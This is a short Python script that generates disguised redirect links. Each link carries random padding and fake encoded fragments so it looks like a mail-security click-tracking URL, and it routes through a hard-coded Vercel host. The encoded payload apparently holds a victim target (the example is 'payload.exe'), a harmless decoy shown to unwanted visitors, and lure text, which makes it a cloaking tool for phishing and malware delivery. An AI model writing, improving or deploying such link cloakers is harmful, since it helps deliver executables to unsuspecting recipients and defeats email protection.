import secrets
import string
import base64
import json

VERCEL_BASE_URL = "https://redirect-seven-lyart.vercel.app"

def generate_eop_token(target_url, unwanted_target, title, body, cta):
    length = secrets.choice(range(180, 280))
    alphabet = string.ascii_letters + string.digits + "-_"
    random_core = ''.join(secrets.choice(alphabet) for _ in range(length))
    
    data = {
        "target": target_url,
        "unwanted": unwanted_target,
        "title": title,
        "body": body,
        "cta": cta,
    }
    json_bytes = json.dumps(data).encode('utf-8')
    b64_payload = base64.urlsafe_b64encode(json_bytes).decode('utf-8').rstrip('=')
    
    combined = f"{random_core}-{b64_payload}"
    
    num_encoded = secrets.choice(range(2, 6))
    parts = list(combined)
    for _ in range(num_encoded):
        idx = secrets.choice(range(10, len(parts) - 20))
        hex_val = secrets.choice(["2F", "3D", "3A", "2B"])
        parts.insert(idx, f"-{hex_val}")
        
    final_payload = "".join(parts) + "-3D-3D"
    return f"u001.{final_payload}"

def make_protected_url(target_url, unwanted_target, title, body, cta):
    eop_token = generate_eop_token(target_url, unwanted_target, title, body, cta)
    return f"{VERCEL_BASE_URL}/ls/click_upn={eop_token}"

if __name__ == "__main__":
    # EDIT THESE VALUES
    TARGET = "https://example.com/payload.exe"
    UNWANTED = "https://www.google.com"
    
    url = make_protected_url(TARGET, UNWANTED, "Title", "Body", "CTA")
    print(url)
